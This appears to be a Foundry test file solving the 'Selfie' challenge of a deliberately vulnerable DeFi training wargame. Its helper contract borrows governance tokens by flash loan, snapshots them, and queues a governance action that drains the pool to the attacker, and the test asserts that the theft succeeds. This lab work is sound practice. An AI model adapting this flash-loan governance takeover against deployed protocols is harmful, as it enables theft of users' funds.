// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableTokenSnapshot} from "../../../src/Contracts/DamnValuableTokenSnapshot.sol";
import {SimpleGovernance} from "../../../src/Contracts/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../../src/Contracts/selfie/SelfiePool.sol";

contract LoanSnapshot {

    address public selfiePoolAddress;
    address public attacker;
    SimpleGovernance public simpleGovernance;

    constructor(address _selfiePoolAddress, address _attacker, address _simpleGov) {
        attacker = _attacker;
        selfiePoolAddress = _selfiePoolAddress;
        simpleGovernance = SimpleGovernance(_simpleGov);
    }

    function flashLoanAttack() external returns (uint256 actionId) {
        SelfiePool selfiePool = SelfiePool(selfiePoolAddress);
        selfiePool.flashLoan(1_500_000e18);

        // invoke governance to drain pool
        actionId = simpleGovernance.queueAction(
            address(selfiePool),
            abi.encodeWithSignature(
                "drainAllFunds(address)",
                attacker
            ),
            0
        );
    }

    function receiveTokens(address tokenAddress, uint256 borrowAmount) external {
        DamnValuableTokenSnapshot dvt = DamnValuableTokenSnapshot(tokenAddress);
        // invoke snapshot
        dvt.snapshot();
        // return borrowed tokens
        dvt.transfer(selfiePoolAddress, borrowAmount);
    }
}

contract Selfie is Test {
    uint256 internal constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 internal constant TOKENS_IN_POOL = 1_500_000e18;

    Utilities internal utils;
    SimpleGovernance internal simpleGovernance;
    SelfiePool internal selfiePool;
    DamnValuableTokenSnapshot internal dvtSnapshot;
    address payable internal attacker;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];

        vm.label(attacker, "Attacker");

        dvtSnapshot = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);
        vm.label(address(dvtSnapshot), "DVT");

        simpleGovernance = new SimpleGovernance(address(dvtSnapshot));
        vm.label(address(simpleGovernance), "Simple Governance");

        selfiePool = new SelfiePool(
            address(dvtSnapshot),
            address(simpleGovernance)
        );

        dvtSnapshot.transfer(address(selfiePool), TOKENS_IN_POOL);

        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), TOKENS_IN_POOL);

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    function testExploit() public {
        /** EXPLOIT START **/
        LoanSnapshot loanSnapshotter = new LoanSnapshot(address(selfiePool), attacker, address(simpleGovernance));
        uint256 actionId = loanSnapshotter.flashLoanAttack();
        vm.warp(block.timestamp + 2 days);
        simpleGovernance.executeAction(actionId);

        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        // Attacker has taken all tokens from the pool
        assertEq(dvtSnapshot.balanceOf(attacker), TOKENS_IN_POOL);
        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), 0);
    }
}
